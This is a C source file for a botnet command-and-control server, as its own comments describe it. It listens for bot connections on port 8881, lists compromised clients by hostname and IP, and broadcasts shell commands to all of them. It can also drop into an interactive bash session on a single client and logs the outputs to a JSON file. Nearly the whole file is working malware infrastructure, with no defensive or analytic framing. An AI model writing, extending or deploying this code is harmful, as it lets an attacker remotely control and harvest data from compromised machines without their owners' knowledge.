// Listens for connection and sends message to connected client
// to compile: gcc server.c -o server -lpthread -ljson-c
// json-c can be installed using the package libjson-c-dev (debian) or json-c-devel (red hat)

#include "simple_networking.h"
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/select.h>
#include <json-c/json.h>
#include <time.h>

// Configurable settings
#define SERVER_PORT 8881
#define TIMEOUT_VALUE 120

// Function declarations
void print_connection(connection client_con, int new_fd);
void print_welcome_message();
void print_help_screen();
void print_command_help_screen();
void *handle_connection(void *my_connection);
void *bot_command(void *current);
void get_time(char *buff);
void get_date(char *buff);
json_object *build_json_object();
void append_json_object(json_object *passedJsonObject, connection *client, char *dataRecieved, char *inputCmd);
void output_to_json(connection *client, char *dataRecieved, char *inputCmd);

// Global Graceful Exit Flag
int exitflag = 0;

// pthread global variables
static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int main(void)
{
    // Set the client connection to be the head of the list
    connection client_con = bind_socket("0.0.0.0", SERVER_PORT);
    client_con.next = NULL;

    print_welcome_message();

    // Add listener information to our head's array
    client_con.pfds = malloc(sizeof(struct pollfd));
    client_con.pfds[0].fd = client_con.sock_fd;
    client_con.pfds[0].events = POLLIN;

    pthread_t control_thread, connection_thread;

    // Create thread to control botnet
    pthread_create(&control_thread, NULL, bot_command, &client_con);
    // Create thread t handle incomming connections
    pthread_create(&connection_thread, NULL, handle_connection, &client_con);

    // Wait for threads to finish
    pthread_join(control_thread, NULL);
    pthread_join(connection_thread, NULL);

    // Exit
    return 0;
}

// Handles incomming connections and appends information to array
// This writes data to the connection struct
void *handle_connection(void *arg)
{
    connection *head = (connection *)arg;
    socklen_t client_addr_size;
    int new_fd;
    int fd_count = 1;

    while (1)
    {
        connection *current = head;

        while (current != NULL)
        {
            // Poll the array for events and set .revents
            int rc = poll(head->pfds, fd_count, -1);

            // Check return code of poll(). Return error if -1
            if (rc == -1)
            {
                perror("[-] Error poll()\n");
                continue;
            }

            // Check if socket is ready to read
            if (head->pfds->revents & POLLIN)
            {
                // If listener is ready to read, handle new connection
                if (head->pfds->fd == head->sock_fd)
                {
                    // Accept queued connection and assign new file descriptor
                    client_addr_size = sizeof(head->client_addr);
                    new_fd = accept(head->sock_fd,
                                    (struct sockaddr *)&head->client_addr, &client_addr_size);

                    // Check return code of accept(). Return error if -1
                    if (new_fd == -1)
                    {
                        perror("[-] Error accept()\n");
                        continue;
                    }
                    else
                    {
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Add new connection information to list
                        connection *new_con = create_connection(head, 0);
                        new_con->pfds->fd = new_fd;
                        new_con->pfds->events = POLLIN;

                        // get client ip orig. implementation from beej - (https://beej.us/guide/bgnet/html/#getpeernameman)
                        socklen_t len;
                        struct sockaddr_storage addr;
                        char ipstr[INET_ADDRSTRLEN];

                        len = sizeof(addr);
                        getpeername(new_fd, (struct sockaddr*)&addr, &len);

                        // deal with both IPv4
                        struct sockaddr_in *s = (struct sockaddr_in *)&addr;
                        new_con->dest_port = ntohs(s->sin_port);
                        inet_ntop(AF_INET, &s->sin_addr, ipstr, sizeof ipstr);
                        new_con->dest_ip = ipstr;

                        // Get hostname from client
                        send(new_con->pfds->fd, "hostname", 8, 0);
                        char recieved_data[8192];
                        int bytes_recv = recv(new_con->pfds->fd, recieved_data, 8192, 0);

                        if (bytes_recv == 0)
                        {
                            // Oops, our recv call failed.
                            printf("[-] Unable to recieve hostname from new client.\n");
                            pthread_mutex_unlock(&mutex);
                            continue;
                        }

                        // Overwrite the newline char with a null terminator
                        recieved_data[bytes_recv - 1] = '\0';

                        new_con->hostname = malloc(bytes_recv);
                        sprintf(new_con->hostname, "%s", recieved_data);
                        
                        // Release lock
                        pthread_mutex_unlock(&mutex);
                    }
                }
            }
            current = current->next;
            fd_count = count_connections(head);
        }
    }
    //return;
}

// This function handles interaction with server and connected clients
void *bot_command(void *arg)

{
    char data[1024];
    char json[4];

    connection *head = (connection *)arg;
    connection *tmp = (connection *)malloc(sizeof(connection));

    // Set timeout values for sockets
    struct timeval timeout;
    timeout.tv_sec = TIMEOUT_VALUE;
    timeout.tv_usec = 0;

    while (1)
    {
        // Prompt user for input and remove trailing newline
        // Indicate user is in 'console' control
        printf("[Console] >> ");
        fgets(data, sizeof(data), stdin);
        data[strcspn(data, "\n")] = 0;

        // print help screen for commands to use in 'console'
        if (strcmp(data, "help") == 0)
        {
            print_help_screen();
        }

        // Display current list of connections
        else if (strcmp(data, "show") == 0)
        {
            // Set lock
            pthread_mutex_lock(&mutex);

            // Omit server info from description
            tmp = head;
            tmp = tmp->next;
            int i = 1;

            // Iterate through array and print client information
            while (tmp != NULL)
            {
                printf("[ID: %d] [%s] [%s:%d]\n", i, tmp->hostname, tmp->dest_ip, tmp->dest_port);
                tmp = tmp->next;
                i++;
            }
            if (i == 1)
            {
                printf("[-] No connections!\n");
            }

            // Release lock
            pthread_mutex_unlock(&mutex);
        }

        // Enter 'command' control
        else if (strcmp(data, "command") == 0)
        {
            printf("\nEnter <help> to display list of available options under the command mode\n");
            printf("\nEnter <back> to exit command mode\n\n");
            while (1)
            {
                // Prompt user for input and remove trailing newline
                printf("[Command] >> ");
                fgets(data, sizeof(data), stdin);
                data[strcspn(data, "\n")] = 0;

                // Print list of commands to use in 'command' control
                if (strcmp(data, "help") == 0)
                {
                    print_command_help_screen();
                }

                // Display current list of connections
                else if (strcmp(data, "show") == 0)
                {
                    // Set lock
                    pthread_mutex_lock(&mutex);

                    // Omit server info from description
                    tmp = head;
                    tmp = tmp->next;
                    int i = 1;

                    // Iterate through array and print client information
                    while (tmp != NULL)
                    {
                        printf("[ID: %d] [%s] [%s:%d]\n", i, tmp->hostname, tmp->dest_ip, tmp->dest_port);
                        tmp = tmp->next;
                        i++;
                    }
                    if (i == 1)
                    {
                        printf("[-] No connections!\n");
                    }

                    // Release lock
                    pthread_mutex_unlock(&mutex);
                }

                // Send command to ALL connections except listener
                else if (strcmp(data, "all") == 0)
                {
                    // This allows consecutive command message to all clients
                    while (1)
                    {
                        // Prompt user for input and remove trailing newline
                        printf("[Command][All] Enter command: ");
                        fgets(data, sizeof(data), stdin);
                        data[strcspn(data, "\n")] = 0;

                        // Exit sending to all clients
                        if (strcmp(data, "back") == 0)
                        {
                            break;
                        }

                        // Send data to client specified by user input, based on array index
                        tmp = head;
                        tmp = tmp->next;
                        // Prompt user to print return in terminal or .json file
                        printf("\nSend return output to .json file? y/N: ");
                        fgets(json, sizeof(json), stdin);
                        json[strcspn(json, "\n")] = 0;
                        while (tmp != NULL)
                        {
                            // Send input command
                            send(tmp->pfds->fd, data, sizeof(data), 0);

                            // Limit the length of the data string
                            char *trunc_data = malloc(24);
                            strncpy(trunc_data, data, 20);
                            if (strlen(data) > strlen(trunc_data))
                            {
                                strcat(trunc_data, "...");
                            }
                        
                            // Print to confirm which client command was sent to
                            printf("[+] Sent %s to %s\n", trunc_data, tmp->hostname);

                            // Wait for a response
                            char recieved_data[8192];
                            int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);

                            if (bytes_recv == 0)
                            {
                                // Oops, our recv call failed.
                                printf("[-] Unable to recieve from %s. Removing from active connections...\n", tmp->hostname);

                                // Delete connection from list
                                delete_connection(head, tmp);
                                tmp = tmp->next;
                                continue;
                            }

                            // Data returned from client
                            recieved_data[bytes_recv] = '\0';

                            // Write output to .json file if desired. Default output to terminal.
                            if (json[0] == 'y' || json[0] == 'Y') {
                                output_to_json(tmp, recieved_data, data);
                            }
                            else
                            {
                                printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
                            }

                            // Move to next connection
                            tmp = tmp->next;
                        }
                    }
                }

                // Send command to SINGLE client
                else if (strcmp(data, "single") == 0)
                {
                    // Prompt user for input, remove trailing newline and convert input to int
                    printf("[Command][Single] Enter client ID: ");
                    fgets(data, sizeof(data), stdin);
                    data[strcspn(data, "\n")] = 0;
                    int num = atoi(data);

                    // Exit sending to single client
                    if (strcmp(data, "back") == 0)
                    {
                        continue;
                    }

                    // Sanitise user input
                    if (num < 1 || num > (count_connections(head) - 1))
                    {
                        printf("[-] No such connection %d. Use show to display client IDs.\n", num);
                        printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
                        continue;
                    }

                    // Find the correct client in the list
                    int i = 0;
                    tmp = head;
                    while (i < num && tmp != NULL)
                    {
                        tmp = tmp->next;
                        i++;
                    }

                    printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                    printf("[+] To escape raw mode, type exit\n");

                    // Send trigger word 'bash' to client to force client to enter bash mode
                    send(tmp->pfds->fd, "bash", 5, 0);

                    // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
                    // Within the while loop, we shouldn't clutter the screen with lots of server generated messages
                    int safe_exit = 0;
                    char input[250];
                    fd_set raw_fds;
                    pthread_mutex_lock(&mutex);
                    while (safe_exit == 0)
                    {
                        // We'll need to start a direct line between stdin here and the client
                        FD_ZERO(&raw_fds);
                        FD_SET(tmp->pfds->fd, &raw_fds);
                        FD_SET(0, &raw_fds);

                        // Use select to find which fd is ready to go
                        int select_return = select(tmp->pfds->fd + 1, &raw_fds, NULL, NULL, &timeout);

                        if (select_return == 0){
                            printf("[-] Timeout occured. Resetting socket.\n");
                            // Timeout occured, close fd and force client to reconnect if active connection exists
                            close(tmp->pfds->fd);
                            delete_connection(head, tmp);
                            safe_exit = 1;
                            break;
                        }

                        // Exit if select returns error
                        if (select_return == -1)
                        {
                            perror("[-] Unable to enter raw mode. select() returned: ");
                            safe_exit = 1;
                            break;
                        }
                        else
                        {
                            // See if we've got something to read on our connection
                            if (FD_ISSET(tmp->pfds->fd, &raw_fds))
                            {
                                // Reset input, no bugs were here yet but I thought it might be a good idea...
                                memset(input, '\0', 250);

                                // Read from socket, store return value for error checking
                                select_return = read(tmp->pfds->fd, input, sizeof(input));
                                if (select_return > 0)
                                {
                                    // Send data on to stdout
                                    write(1, input, select_return);
                                }
                                else if (select_return < 0)
                                {
                                    // Print error and exit if error on read()
                                    perror("[-] Unable to read from client.");
                                    safe_exit = 1;
                                    break;
                                }
                            }

                            // See if we've got something on stdin
                            if (FD_ISSET(0, &raw_fds))
                            {
                                // Reset input - this fixes strstr later on...
                                memset(input, '\0', 250);
                                select_return = read(0, input, sizeof(input));
                                if (select_return > 0)
                                {
                                    // Match anything with exit in the string. This is ugly :/
                                    if (strstr(input, "exit") != NULL)
                                    {
                                        printf("[+] Exiting RAW mode\n");
                                        write(tmp->pfds->fd, "exit", 5);
                                        safe_exit = 1;
                                        break;
                                    }
                                    // Send data to client
                                    write(tmp->pfds->fd, input, select_return);
                                }
                                else if (select_return < 0)
                                {
                                    // Print error and exit if error on write()
                                    perror("[-] Unable to send to client.");
                                    safe_exit = 1;
                                    break;
                                }
                            }
                        }
                    }
                    pthread_mutex_unlock(&mutex);
                }
                // Exit command control
                else if (strcmp(data, "back") == 0)
                {
                    break;
                }
            }
        }

        // Exit control of bot
        else if (strcmp(data, "exit") == 0)
        {
            while (1)
            {
                // Prompt to check exit is intentional
                printf("Are you sure? y/N: ");
                fgets(data, sizeof(data), stdin);
                data[strcspn(data, "\n")] = 0;
                // Default to no
                if (data[0] == 'y' || data[0] == 'Y')
                {
                    exit(0);
                }
                break;
            }
        }
    }
}

// Function to return current time
void get_time(char *buff)
{
    time_t currentTime;
    struct tm *convertedTime;

    // Get time (epoch) and convert to local time
    currentTime = time(NULL);
    convertedTime = localtime(&currentTime);

    // Format time (HH:MM AM/PM) and store in buff
    strftime(buff, 100, "%I:%M %p", convertedTime);

}

// Function to return current date
void get_date(char *buff)
{
    time_t currentTime;
    struct tm *convertedTime;

    // Get time (epoch) and convert to local
    currentTime = time(NULL);
    convertedTime = localtime(&currentTime);

    // Format time to hold date (DD/MM/YY) and store in buff
    strftime(buff, 100, "%d/%m/%y", convertedTime);
}


// Following json functions - https://json-c.github.io/json-c/json-c-0.10/doc/html/index.html

// https://json-c.github.io/json-c/json-c-0.10/doc/html/json__tokener_8h.html#abf031fdf1e5caab71e2225a99588c6bb
// Function to read file and store in json object
json_object *parse_json_file(FILE *fp)
{
    char *buffer;
    int stringlen;

    // Create json object for parsing and error checking
    json_object *parsed_json = json_object_new_object();
    json_tokener *token = json_tokener_new();

    // Create error token for checking file read contains valid json values
    enum json_tokener_error errorToken;

    if (fp != NULL) 
    {
        // Seek to end of file
        if (fseek(fp, 0, SEEK_END) == 0) 
        {
            // Return size of file
            long size = ftell(fp);

            // Assign memory to buffer based on size of file
            buffer = malloc(size + 1);
            
            // Return to beginning of file
            fseek(fp, 0, SEEK_SET);

            // Read whole file in to buffer
            size_t len = fread(buffer, sizeof(char), size, fp);

            // Write EOF
            buffer[len++] = '\0';
        }
    }

    // Store length of string held in buffer
    stringlen = strlen(buffer);

    // Parse contents of buffer to json_object and store error/success token
    parsed_json = json_tokener_parse_ex(token, buffer, stringlen);

    // Check if token returned was success
    if ((errorToken = json_tokener_get_error(token)) != json_tokener_success)
    {
        // errorToken does not hold success - print description of error to stderr and return NULL
        fprintf(stderr, "[-] Error. %s\n", json_tokener_error_desc(errorToken));
        return NULL;
    }
 
    // Success - Return json object
    return parsed_json;
}

// https://json-c.github.io/json-c/json-c-0.10/doc/html/json__object_8h.html#af0ed3555604f39ac74b5e28bc5b1f82c
// Function to build template of json object
json_object *build_json_object()
{
    // Create json object
    json_object *jsonObject = json_object_new_object();

    // Create identifier for json file
    json_object *objectType = json_object_new_string("outputs");

    // Create array for json object
    json_object *outputsArray = json_object_new_array();

    // Add objects to main json object
    json_object_object_add(jsonObject,"type", objectType);
    json_object_object_add(jsonObject,"returned results", outputsArray);

    // Return skeleton json object for appending to
    return jsonObject;

}

// Function to append information to json object
void append_json_object(json_object *passedJsonObject, connection *client, char *dataRecieved, char *inputCmd)
{
    // Create date and time buffers
    char *timeBuffer = malloc(10);
    char *dateBuffer = malloc(10);

    // Assign date and time values to buffers
    get_time(timeBuffer);
    get_date(dateBuffer);

    // Create json results object
    json_object *jsonObject = json_object_new_object();

    // Create properties' object and data
    json_object *propertiesObject = json_object_new_object();
    json_object *hostName = json_object_new_string(client->hostname);
    json_object *cmdName = json_object_new_string(inputCmd);
    json_object *time = json_object_new_string(timeBuffer);
    json_object *date = json_object_new_string(dateBuffer);
    json_object *ipAddr = json_object_new_string(client->dest_ip);

    // Add properties' data to object
    json_object_object_add(propertiesObject, "hostname", hostName);
    json_object_object_add(propertiesObject, "input command", cmdName);
    json_object_object_add(propertiesObject, "time", time);
    json_object_object_add(propertiesObject, "date", date);
    json_object_object_add(propertiesObject, "ip address", ipAddr);

    // Create returned object and data
    json_object *returnedObject = json_object_new_object();
    json_object *results = json_object_new_string(dataRecieved);

    // Add to returned data to object
    json_object_object_add(returnedObject, "results", results);

    // Add both properties and returned objects to 'main' object
    json_object_object_add(jsonObject,"properties", propertiesObject);
    json_object_object_add(jsonObject,"returned", returnedObject);

    // https://json-c.github.io/json-c/json-c-0.10/doc/html/json__object_8h.html#aba4e8df5e00bdc91a89bfb775e04ed70
    // Get reference to json array object and store in array var
    struct json_object *array;
    if (!json_object_object_get_ex(passedJsonObject, "returned results", &array))
    {
        // Data in file did not contain key value "returned results"
        printf("[-] Error. Key not found. Ensure file contains correct data.\n");
        return;
    }

    // Add 'main' object to array
    json_object_array_add(array, jsonObject);
}

// Function to write json object to file
void output_to_json(connection *client, char *dataRecieved, char *inputCmd)
{
    FILE *jsonFile;

    // Check if we can open file this will determine if it exists or not
    if ((jsonFile = fopen("outputs.json", "r+"))) 
    {
        // file exists
        json_object *parsed_json_object = parse_json_file(jsonFile);
        // Parse json file in to json object
        if (parsed_json_object == NULL)
        {
            printf("[-] Bad data in file. Delete file and try again.\n");
            fclose(jsonFile);
            return;
        }

        // Close file that's opened in read mode
        fclose(jsonFile);

        // Append output results to json object
        append_json_object(parsed_json_object, client, dataRecieved, inputCmd);

        // Open json file and write object
        jsonFile = fopen("outputs.json", "w");
        fprintf(jsonFile, "%s", json_object_to_json_string(parsed_json_object));
    }
    else 
    {
        // file doesnt exist

        // Create new json skeleton object
        json_object *newJsonObject = build_json_object();

        // Append output results to json object
        append_json_object(newJsonObject, client, dataRecieved, inputCmd);

        // Open json file and write object
        jsonFile = fopen("outputs.json", "w");
        fprintf(jsonFile, "%s", json_object_to_json_string(newJsonObject));
    }
    // Close jsonFile
    fclose(jsonFile);
}

// Function to print welcome screen
void print_welcome_message()
{
    // Clear terminal screen
    system("clear");

    printf("\n******************************************************************************\n");
    printf("dP   dP   dP  88888888b dP         a88888b.  .88888.  8888ba.88ba   88888888b \n");
    printf("88   88   88  88        88        d8'   `88 d8'   `8b 88  `8b  `8b  88        \n");
    printf("88  .8P  .8P  88aaaa    88        88        88     88 88   88   88  88aaaa    \n");
    printf("88  d8'  d8'  88        88        88        88     88 88   88   88  88        \n");
    printf("88.d8P8.d8P   88        88        Y8.   .88 Y8.   .8P 88   88   88  88        \n");
    printf("8888' Y88'    88888888P 88888888P  Y88888P'  `8888P'  dP   dP   dP  88888888P \n");
    printf("******************************************************************************\n\n");
    printf("This is the console page\n");
    printf("Please enter <help> to display a list of available commands\n");
    printf("Enter <exit> to terminate the program\n\n");

    return;
}

// Example help screen function
void print_help_screen()
{
    printf("\nCONSOLE PAGE\n\n");
    printf("Options            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connected clients\n");
    printf("help             : List of commands from console    \n");
    printf("exit             : Terminate the program            \n");
    printf("command          : Enter command control mode       \n");
    printf("=====================================================\n\n");
    return;
}

void print_command_help_screen()
{
    printf("\nCOMMAND PAGE\n\n");
    printf("OPTIONS            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connections       \n");
    printf("help             : List of commands from console     \n");
    printf("all              : Send command to all connections   \n");
    printf("single           : Send command to a connected client\n");
    printf("back             : back to the previous page         \n");
    printf("=====================================================\n\n");
    return;
}
